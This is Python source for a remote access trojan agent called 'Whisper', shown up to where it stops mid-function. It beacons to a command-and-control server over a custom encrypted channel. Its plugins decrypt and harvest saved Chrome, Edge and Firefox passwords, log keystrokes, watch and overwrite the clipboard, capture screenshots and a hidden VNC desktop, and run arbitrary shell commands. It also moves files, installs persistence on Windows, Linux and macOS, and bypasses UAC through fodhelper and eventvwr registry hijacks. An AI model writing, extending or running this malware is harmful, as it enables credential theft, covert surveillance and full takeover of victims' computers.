import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform

C2_HOST = '127.0.0.1'
C2_PORT = 4443
ENCRYPTION_PASSWORD = 'whisper_secret_key'
RECONNECT_DELAY = 10

def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
def _eb(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
def _db(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))
def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
def rms(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return dec(d)
def sms(s, d):
    p = enc(d); s.sendall(len(p).to_bytes(4, "big") + p)

_CMDS = {}

# --- browser_harvest plugin ---

def _aes_gcm_decrypt(key, data, aad=None):
    if isinstance(data, bytes) and data[:3] == b"v10": data = data[3:]
    nonce, ct, tag = data[:12], data[12:-16], data[-16:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct + tag, aad)
    except ImportError:
        try:
            from Crypto.Cipher import AES
            c = AES.new(key, AES.MODE_GCM, nonce=nonce)
            if aad: c.update(aad)
            return c.decrypt_and_verify(ct, tag)
        except ImportError:
            try:
                import subprocess, sys
                subprocess.run([sys.executable, "-m", "pip", "install", "cryptography", "-q"], timeout=30)
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                return AESGCM(key).decrypt(nonce, ct + tag, aad)
            except: return None

def _decrypt_key(ek):
    try:
        import ctypes; from ctypes import wintypes
        class B(ctypes.Structure): _fields_ = [("s", wintypes.DWORD), ("d", ctypes.POINTER(ctypes.c_byte))]
        kb = base64.b64decode(ek)
        if kb[:5] == b"DPAPI": kb = kb[5:]
        bi = B(len(kb), ctypes.cast(kb, ctypes.POINTER(ctypes.c_byte))); bo = B()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.d, bo.s); ctypes.windll.kernel32.LocalFree(bo.d); return r
    except: return None

def _ff_key(profile):
    k4 = os.path.join(profile, "key4.db")
    lf = os.path.join(profile, "logins.json")
    if not os.path.isfile(k4) or not os.path.isfile(lf): return None
    try:
        import sqlite3, hashlib
        conn = sqlite3.connect(k4)
        gs = conn.execute("SELECT item1 FROM metadata WHERE id=1").fetchone()
        if not gs: conn.close(); return None
        gs = gs[0]
        row = conn.execute("SELECT a11, a102 FROM nssPrivate WHERE id=1").fetchone()
        conn.close()
        if not row: return None
        a11, a102 = row
        if not a11 or not a102: return None
        hp = hashlib.sha1(gs + b"\x00").digest()[:20]
        chp = hashlib.sha1(hp).digest()[:20]
        k1 = hashlib.sha1(chp + gs).digest()[:20]
        tk = hashlib.sha1(gs + chp).digest()[:20]
        k2 = hashlib.sha1(tk + chp).digest()[:20]
        wk = k1[:16]
        import struct
        d = a11
        if d[0] == 0x30:
            o = 2 + (d[1] & 0x7f) if d[1] & 0x80 else 2
            if d[o] == 0x04:
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
            while o < len(d) and d[o] != 0x04:
                o += 1
            if o < len(d):
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
                d = d[o:]
        mk = _aes_gcm_decrypt(wk, d, a102)
        if mk is None:
            wk = (k1 + k2)[:24]
            mk = _aes_gcm_decrypt(wk, d, a102)
        return mk
    except: return None

def _ff_decrypt(mk, val):
    if not mk or not val: return ""
    try:
        d = base64.b64decode(val)
        r = _aes_gcm_decrypt(mk, d)
        if r: return r.decode(errors="replace")
    except: pass
    return "[encrypted]"

def _harvest_chrome(path):
    try:
        import sqlite3, shutil, tempfile
        ls = os.path.join(path, "Local State")
        if not os.path.isfile(ls): return []
        with open(ls) as f: state = json.load(f)
        ek = state.get("os_crypt", {}).get("encrypted_key", "")
        if not ek: return []
        mk = _decrypt_key(ek)
        if not mk: return []
        creds = []
        for entry in os.listdir(path):
            db = os.path.join(path, entry, "Login Data")
            if not os.path.isfile(db): continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db, tmp)
                for row in sqlite3.connect(tmp).execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if not row[2]: continue
                    p = _aes_gcm_decrypt(mk, row[2])
                    if p:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": p.decode(errors="replace")})
                    else:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": "[encrypted]"})
            except: pass
            finally:
                try: os.remove(tmp)
                except: pass
        return creds
    except: return []

def _cmd_harvest(m):
    r = {"passwords": [], "cookies": []}
    if platform.system() == "Windows":
        local = os.environ.get("LOCALAPPDATA", "")
        for b, p in [("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
                     ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data"))]:
            if os.path.isdir(p):
                mk = None
                for c in _harvest_chrome(p):
                    c["browser"] = b; r["passwords"].append(c)
    base = {"Windows": os.environ.get("APPDATA", ""), "Linux": os.path.expanduser("~/.mozilla/firefox"),
            "Darwin": os.path.expanduser("~/Library/Application Support/Firefox/Profiles")}.get(platform.system(), "")
    if os.path.isdir(base):
        for prof in sorted(os.listdir(base)):
            fp = os.path.join(base, prof)
            lf = os.path.join(fp, "logins.json")
            if not os.path.isfile(lf): continue
            mk = _ff_key(fp)
            if not mk: continue
            try:
                with open(lf) as f: data = json.load(f)
                for item in data.get("logins", []):
                    r["passwords"].append({"browser": "Firefox", "url": item.get("hostname","")[:120], "user": _ff_decrypt(mk, item.get("encryptedUsername","")), "pass": _ff_decrypt(mk, item.get("encryptedPassword",""))})
            except: pass
    r["total"] = len(r["passwords"])
    return {"data": r}
_CMDS["harvest"] = _cmd_harvest


# --- clipboard plugin ---

_CREATE_NO_WINDOW = 0x08000000

def _get_clipboard_text():
    try:
        out = subprocess.check_output(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace").strip("\r\n ") or None
    except: return None

def _set_clipboard_text(text):
    try:
        safe = text.replace('"', '`"')
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{safe}"'],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
    except: pass

def _cmd_clipboard_get(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = _get_clipboard_text()
        if text:
            return {"data": text[:2000]}
        return {"output": "[!] No text on clipboard"}
    except Exception as e: return {"output": f"[!] Clipboard error: {e}"}

_clip_monitor_run = [False]
_clip_log = []

def _clip_monitor_thread():
    last = None
    while _clip_monitor_run[0]:
        try:
            text = _get_clipboard_text()
            if text and text != last:
                last = text
                _clip_log.append(text[:500])
        except: pass
        time.sleep(1)

def _cmd_clipboard_monitor(m):
    try:
        action = m.get("action", "start")
        if action == "start":
            if _clip_monitor_run[0]: return {"output": "[!] Clipboard monitor already running"}
            _clip_monitor_run[0] = True
            _clip_log.clear()
            threading.Thread(target=_clip_monitor_thread, daemon=True).start()
            return {"output": "[+] Clipboard monitor started"}
        elif action == "stop":
            _clip_monitor_run[0] = False
            return {"output": "[+] Clipboard monitor stopped"}
        elif action == "dump":
            logs = list(_clip_log)
            _clip_log.clear()
            return {"output": "\n".join(logs[-20:]) if logs else "[!] No clipboard captures"}
        return {"output": "[!] Use action=start/stop/dump"}
    except Exception as e: return {"output": f"[!] Clipboard monitor error: {e}"}

def _cmd_clipboard_set(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = m.get("text", "")
        _set_clipboard_text(text)
        return {"output": f"[+] Clipboard set to: {text[:100]}"}
    except Exception as e: return {"output": f"[!] Clipboard set error: {e}"}

_CMDS["clipboard_get"] = _cmd_clipboard_get
_CMDS["clipboard_monitor"] = _cmd_clipboard_monitor
_CMDS["clipboard_set"] = _cmd_clipboard_set


# --- file_manager plugin ---

def _cmd_ls(m):
    try:
        items = []
        for e in os.scandir(m.get("path", ".")):
            try:
                st = e.stat()
                items.append({"name": e.name, "type": "dir" if e.is_dir() else "file",
                              "size": st.st_size if e.is_file() else 0,
                              "mtime": st.st_mtime if hasattr(st, "st_mtime") else 0})
            except: pass
        return {"path": os.path.abspath(m.get("path", ".")), "items": items}
    except Exception as e: return {"error": str(e)}

def _cmd_upload(m):
    try:
        os.makedirs(os.path.dirname(m["path"]), exist_ok=True)
        with open(m["path"], "wb") as f: f.write(base64.b64decode(m["data"]))
        return {"output": f"[+] Uploaded to {m['path']}"}
    except Exception as e: return {"output": f"[!] Upload failed: {e}"}

def _cmd_download(m):
    try:
        with open(m["path"], "rb") as f: return {"data": base64.b64encode(f.read()).decode()}
    except Exception as e: return {"error": str(e)}

def _cmd_delete(m):
    try:
        p = m["path"]
        if os.path.isdir(p):
            import shutil
            shutil.rmtree(p)
        else:
            os.remove(p)
        return {"output": f"[+] Deleted: {p}"}
    except Exception as e: return {"output": f"[!] Delete failed: {e}"}

def _cmd_execute(m):
    try:
        p = m["path"]
        args = m.get("args", "")
        wait = m.get("wait", False)
        cmd = f'"{p}" {args}'.strip()
        if wait:
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=int(m.get("timeout", 30)))
            out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
            return {"output": out[:5000] if out else f"[+] Executed (exit={r.returncode})"}
        else:
            subprocess.Popen(cmd, shell=True, close_fds=True)
            return {"output": f"[+] Started: {p}"}
    except subprocess.TimeoutExpired: return {"output": "[!] Execution timed out"}
    except Exception as e: return {"output": f"[!] Execute failed: {e}"}

def _cmd_search(m):
    try:
        root = m.get("path", ".")
        pattern = m.get("pattern", "*")
        max_results = min(m.get("max", 50), 200)
        results = []
        try:
            import fnmatch
            count = 0
            for r, dirs, files in os.walk(root):
                for f in files:
                    if fnmatch.fnmatch(f, pattern):
                        fp = os.path.join(r, f)
                        try:
                            sz = os.path.getsize(fp)
                            results.append({"path": fp, "size": sz})
                            count += 1
                            if count >= max_results: break
                        except: pass
                if count >= max_results: break
        except: pass
        if not results: return {"output": f"[!] No files matching '{pattern}' in {root}"}
        lines = [f"[+] Found {len(results)} files:"]
        for r in results[:30]:
            lines.append(f"  {r['size']:>10,} B  {r['path'][:120]}")
        if len(results) > 30: lines.append(f"  ... and {len(results)-30} more")
        return {"output": "\n".join(lines), "files": results}
    except Exception as e: return {"output": f"[!] Search error: {e}"}

_CMDS["ls"] = _cmd_ls
_CMDS["upload"] = _cmd_upload
_CMDS["download"] = _cmd_download
_CMDS["delete"] = _cmd_delete
_CMDS["execute"] = _cmd_execute
_CMDS["search"] = _cmd_search


# --- hvnc plugin ---

_hvnc_name = "Whisper_HVNC_" + str(os.getpid())
_hvnc_desk = None
_hvnc_run = [False]

def _hvnc_thread():
    global _hvnc_desk
    import ctypes
    u32 = ctypes.windll.user32
    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, 0x1000, None)
    if not desk:
        _hvnc_desk = None; _hvnc_run[0] = False; return
    _hvnc_desk = desk; _hvnc_run[0] = True
    try:
        si = subprocess.STARTUPINFO()
        si.lpDesktop = _hvnc_name
        subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
        while _hvnc_run[0] and desk:
            time.sleep(2)
    finally:
        if desk: u32.CloseDesktop(desk)
        _hvnc_desk = None; _hvnc_run[0] = False

def _cmd_hvnc_start(m):
    if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
    threading.Thread(target=_hvnc_thread, daemon=True).start()
    time.sleep(0.5)
    if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
    return {"output": "[!] HVNC failed - create thread failed"}

def _cmd_hvnc_stop(m):
    _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}

def _ss_gdi(desk_handle=None):
    try:
        import ctypes, struct
        u32 = ctypes.windll.user32; g32 = ctypes.windll.gdi32
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if desk_handle and not u32.SwitchDesktop(desk_handle):
            if cur: u32.CloseDesktop(cur)
            return None
        ctypes.windll.kernel32.Sleep(200)
        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        hdc_src = u32.GetDC(None)
        hdc_dst = g32.CreateCompatibleDC(hdc_src)
        hbmp = g32.CreateCompatibleBitmap(hdc_src, w, h)
        g32.SelectObject(hdc_dst, hbmp)
        g32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        W = ctypes.wintypes
        class BIH(ctypes.Structure):
            _fields_ = [("s", W.DWORD), ("w", W.LONG), ("h", W.LONG),
                        ("p", W.WORD), ("b", W.WORD), ("c", W.DWORD),
                        ("s2", W.DWORD), ("x", W.LONG), ("y", W.LONG),
                        ("u", W.DWORD), ("v", W.DWORD)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        sz = w * h * 4; bits = (ctypes.c_byte * sz)()
        g32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        u32.ReleaseDC(None, hdc_src); g32.DeleteDC(hdc_dst); g32.DeleteObject(hbmp)
        hdr = struct.pack("<HIHHI", 0x4D42, 54 + sz, 0, 0, 54)
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return hdr + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
    except: return None

def _cmd_hvnc_screenshot(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        bmp = _ss_gdi(_hvnc_desk)
        if bmp: return {"data": base64.b64encode(bmp).decode()}
        return {"output": "[!] HVNC screenshot failed"}
    except Exception as e: return {"output": f"[!] HVNC screenshot: {e}"}

def _cmd_hvnc_stream(m):
    try:
        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
        count = min(m.get("count", 5), 20)
        delay = max(min(m.get("delay", 1), 5), 0.5)
        images = []
        for i in range(count):
            bmp = _ss_gdi(_hvnc_desk)
            if bmp: images.append(base64.b64encode(bmp).decode())
            time.sleep(delay)
        return {"data": images, "count": len(images)} if images else {"output": "[!] HVNC stream failed"}
    except Exception as e: return {"output": f"[!] HVNC stream: {e}"}

def _hvnc_send_input(input_type, flags, data, extra=0):
    try:
        import ctypes
        u32 = ctypes.windll.user32
        if not _hvnc_desk: return False
        cur = u32.OpenInputDesktop(0, False, 0x0100)
        if not u32.SwitchDesktop(_hvnc_desk):
            if cur: u32.CloseDesktop(cur)
            return False
        ctypes.windll.kernel32.Sleep(50)
        W = ctypes.wintypes
        class MOUSEI(ctypes.Structure):
            _fields_ = [("dx", W.LONG), ("dy", W.LONG), ("md", W.DWORD),
                        ("flags", W.DWORD), ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class KEYI(ctypes.Structure):
            _fields_ = [("vk", W.WORD), ("scan", W.WORD), ("flags", W.DWORD),
                        ("t", W.DWORD), ("ei", ctypes.POINTER(ctypes.c_ulong))]
        class _U(ctypes.Union):
            _fields_ = [("mi", MOUSEI), ("ki", KEYI), ("hi", ctypes.c_ulong * 3)]
        class INPUT(ctypes.Structure):
            _fields_ = [("type", W.DWORD), ("u", _U)]
        inp = INPUT()
        inp.type = input_type
        if input_type == 0:
            inp.u.mi = MOUSEI(data[0], data[1], extra, flags, 0, None)
        else:
            inp.u.ki = KEYI(data, extra, flags, 0, None)
        ret = u32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
        if cur: u32.SwitchDesktop(cur); u32.CloseDesktop(cur)
        return ret == 1
    except: return False

def _cmd_hvnc_mouse(m):
    try:
        action = m.get("action", "move")
        x = int(m.get("x", 0)); y = int(m.get("y", 0))
        acts = {"move": 0x0001, "click": 0x0002|0x0004, "rightclick": 0x0008|0x0010,
                "doubleclick": 0x0002|0x0004}
        if action not in acts: return {"output": f"[!] Unknown: {action}"}
        ok = _hvnc_send_input(0, acts[action], (x, y))
        if action == "doubleclick":
            time.sleep(0.05)
            ok = _hvnc_send_input(0, acts[action], (x, y))
        return {"output": f"[+] Mouse {action} ({x},{y}): {'OK' if ok else 'FAIL'}"}
    except Exception as e: return {"output": f"[!] HVNC mouse: {e}"}

def _cmd_hvnc_key(m):
    try:
        action = m.get("action", "press")
        if action == "type":
            text = m.get("text", "")
            for c in text:
                vk = ord(c.upper())
                _hvnc_send_input(1, 0, vk)
                _hvnc_send_input(1, 2, vk)
            return {"output": f"[+] Typed '{text[:50]}'"}
        key = int(m.get("key", 0))
        _hvnc_send_input(1, 0, key)
        _hvnc_send_input(1, 2, key)
        return {"output": "+ Key press OK"}
    except Exception as e: return {"output": f"[!] HVNC key: {e}"}

_CMDS["hvnc_start"] = _cmd_hvnc_start
_CMDS["hvnc_stop"] = _cmd_hvnc_stop
_CMDS["hvnc_screenshot"] = _cmd_hvnc_screenshot
_CMDS["hvnc_stream"] = _cmd_hvnc_stream
_CMDS["hvnc_mouse"] = _cmd_hvnc_mouse
_CMDS["hvnc_key"] = _cmd_hvnc_key


# --- keylogger plugin ---

_kl_keys = []; _kl_run = [False]
def _kl_thread():
    _kl_run[0] = True
    if platform.system() == "Windows":
        from ctypes import windll
        while _kl_run[0]:
            for c in range(255):
                if windll.user32.GetAsyncKeyState(c) & 1: _kl_keys.append(c)
            time.sleep(0.01)
    elif platform.system() == "Linux":
        try:
            from pynput import keyboard
            def _kp(k):
                try: _kl_keys.append(k.char)
                except: _kl_keys.append(f"[{k}]")
            with keyboard.Listener(on_press=_kp) as l: l.join()
        except: pass
    _kl_run[0] = False

def _cmd_keylog_start(m):
    if not _kl_run[0]: threading.Thread(target=_kl_thread, daemon=True).start(); return {"output": "[+] Keylogger started"}
    return {"output": "[!] Already running"}

def _cmd_keylog_stop(m):
    _kl_run[0] = False; return {"output": "[+] Keylogger stopped"}

def _cmd_keylog_get(m):
    o = "".join(str(c) if isinstance(c, int) else c for c in _kl_keys); _kl_keys.clear()
    return {"output": o or "(no keys captured)"}
_CMDS["keylog_start"] = _cmd_keylog_start; _CMDS["keylog_stop"] = _cmd_keylog_stop; _CMDS["keylog_get"] = _cmd_keylog_get


# --- persistence plugin ---

def _cmd_persist(m):
    try:
        if platform.system() == "Windows":
            sp = os.path.abspath(sys.argv[0]); r = []
            action = m.get("action", "install")
            import winreg
            name = m.get("name", "Whisper")

            if action == "install":
                # Registry Run keys
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, sp)
                        r.append("HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU")
                    except: pass
                # Startup Folder
                sf = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                try:
                    os.makedirs(sf, exist_ok=True)
                    with open(os.path.join(sf, f"{name}.bat"), "w") as f:
                        f.write(f'@start "" "{sp}"')
                    r.append("Startup")
                except: pass
                # WMI
                try:
                    subprocess.run(f'wmic startup call create "{sp}", "{name}"', shell=True, capture_output=True, timeout=10)
                    r.append("WMI")
                except: pass
                # Scheduled Task (run on logon)
                try:
                    subprocess.run(f'schtasks /create /tn "{name}" /tr "{sp}" /sc onlogon /ru "%%USERNAME%%" /f', shell=True, capture_output=True, timeout=15)
                    r.append("SchedTask")
                except: pass
                # Windows Service (via sc)
                try:
                    svc_name = f"{name}Svc"
                    subprocess.run(f'sc create "{svc_name}" binPath= "{sp}" start= auto', shell=True, capture_output=True, timeout=10)
                    subprocess.run(f'sc description "{svc_name}" "Service"', shell=True, capture_output=True, timeout=10)
                    r.append("Service")
                except: pass
                return {"output": f"[+] Persistence: {', '.join(r) if r else 'failed'}"}

            else:  # remove
                # Registry
                for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                  (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                            winreg.DeleteValue(k, name)
                        r.append(f"Removed HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "Removed HKCU")
                    except: pass
                # Startup
                try:
                    os.remove(os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat"))
                    r.append("Removed Startup")
                except: pass
                # Scheduled Task
                try:
                    subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True, timeout=10)
                    r.append("Removed SchedTask")
                except: pass
                # Service
                try:
                    subprocess.run(f'sc delete "{name}Svc"', shell=True, capture_output=True, timeout=10)
                    r.append("Removed Service")
                except: pass
                return {"output": f"[+] Persistence removed: {', '.join(r) if r else 'nothing found'}"}

        elif platform.system() == "Linux":
            h = os.path.expanduser("~"); r = []
            sp = os.path.abspath(sys.argv[0])
            action = m.get("action", "install")
            if action == "install":
                for d in [os.path.join(h,".config","autostart")]:
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"whisper.desktop"),"w") as f:
                        f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {sp}\n")
                    r.append("autostart")
                try:
                    subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {sp}") | crontab -', shell=True, timeout=10)
                    r.append("crontab")
                except: pass
            else:
                for d in [os.path.join(h,".config","autostart")]:
                    try:
                        os.remove(os.path.join(d,"whisper.desktop"))
                        r.append("Removed autostart")
                    except: pass
                try:
                    out = subprocess.check_output(["crontab","-l"], timeout=5).decode()
                    new = "\n".join(l for l in out.split("\n") if sp not in l)
                    subprocess.run(f"crontab -", input=new, shell=True, timeout=5)
                    r.append("Removed crontab")
                except: pass
            return {"output": f"[+] Persistence: {', '.join(r)}"}

        elif platform.system() == "Darwin":
            h = os.path.expanduser("~"); pl = os.path.join(h, "Library", "LaunchAgents", "com.whisper.plist")
            action = m.get("action", "install")
            if action == "install":
                os.makedirs(os.path.dirname(pl), exist_ok=True)
                with open(pl,"w") as f:
                    f.write('<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.whisper</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>'+os.path.abspath(sys.argv[0])+'</string></array><key>RunAtLoad</key><true/></dict></plist>')
                subprocess.run(["launchctl","load",pl], capture_output=True)
                return {"output": "[+] Persistence: LaunchAgent"}
            else:
                subprocess.run(["launchctl","unload",pl], capture_output=True)
                try: os.remove(pl)
                except: pass
                return {"output": "[+] Persistence: LaunchAgent removed"}
    except Exception as e: return {"output": f"[!] Persistence failed: {e}"}

def _cmd_persist_check(m):
    try:
        r = []
        if platform.system() == "Windows":
            import winreg
            for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                              (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                try:
                    with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                        val, _ = winreg.QueryValueEx(k, "Whisper")
                        r.append(f"Registry ({'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}): {val}")
                except: pass
            import subprocess
            try:
                out = subprocess.check_output(f'schtasks /query /tn "Whisper" /fo LIST', shell=True, timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
                r.append("Scheduled Task: " + out.split("\n")[0][:80])
            except: pass
            return {"output": "\n".join(r) if r else "[!] No persistence found"}
        return {"output": "[!] Check not supported on this OS"}
    except Exception as e: return {"output": f"[!] Persist check error: {e}"}

_CMDS["persist"] = _cmd_persist
_CMDS["persist_check"] = _cmd_persist_check


# --- screenshot plugin ---

def _cmd_screenshot(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] Screenshot requires Windows"}
        import ctypes, struct
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        hdc_src = ctypes.windll.user32.GetDC(None)
        hdc_dst = ctypes.windll.gdi32.CreateCompatibleDC(hdc_src)
        hbmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_src, w, h)
        ctypes.windll.gdi32.SelectObject(hdc_dst, hbmp)
        ctypes.windll.gdi32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        sz = w * h * 4
        bits = (ctypes.c_byte * sz)()
        class BIH(ctypes.Structure): _fields_ = [("s", ctypes.c_uint32),("w", ctypes.c_int32),("h", ctypes.c_int32),("p", ctypes.c_uint16),("b", ctypes.c_uint16),("c", ctypes.c_uint32),("s2", ctypes.c_uint32),("x", ctypes.c_int32),("y", ctypes.c_int32),("u", ctypes.c_uint32),("v", ctypes.c_uint32)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        ctypes.windll.gdi32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        ctypes.windll.user32.ReleaseDC(None, hdc_src); ctypes.windll.gdi32.DeleteDC(hdc_dst); ctypes.windll.gdi32.DeleteObject(hbmp)
        data = struct.pack("<HIHHI", 0x4D42, 54+sz, 0, 0, 54) + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
        return {"data": base64.b64encode(data).decode()}
    except Exception as e:
        try:
            import subprocess, base64
            ps = '''
Add-Type -AssemblyName System.Drawing,System.Windows.Forms
$bmp = [System.Windows.Forms.Clipboard]::GetImage()
if (-not $bmp) {
    $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $g.Dispose()
}
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$bmp.Dispose()
'''
            r = subprocess.run(["powershell","-NoP","-NonI","-Command",ps], capture_output=True, text=True, timeout=30, creationflags=0x08000000)
            if r.returncode == 0 and r.stdout.strip():
                return {"data": r.stdout.strip()}
            raise Exception(r.stderr[:200] if r.stderr else "PS failed")
        except Exception as e2:
            return {"output": f"[!] Screenshot failed: {e2}"}
_CMDS["screenshot"] = _cmd_screenshot


# --- shell plugin ---

def _cmd_shell(m):
    try:
        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
        return {"output": (r.stdout + r.stderr) or "(no output)"}
    except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
    except Exception as e: return {"output": f"[!] {e}"}
_CMDS["shell"] = _cmd_shell


# --- uac_bypass plugin ---

import ctypes, sys

def _uac_fodhelper():
    import winreg
    try:
        cmd = sys.executable + " " + " ".join(sys.argv)
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _uac_eventvwr():
    import winreg
    try:
        cmd = sys.executable + " " + " ".join(sys.argv)
        key_path = r"Software\Classes\mscfile\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _cmd_uac_bypass(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] UAC bypass is Windows-only"}
        if ctypes.windll.shell32.IsUserAnAdmin():
            return {"output": "[+] Already running as admin"}
        method = m.get("method", "fodhelper")
        ok = None
        if method in ("fodhelper", "auto"):
            ok = _uac_fodhelper()
        if not ok and method in ("eventvwr", "auto"):
            ok = _uac_eventvwr()
        if ok:
            return {"output": f"[+] UAC bypass triggered via {method}, elevated process spawned"}
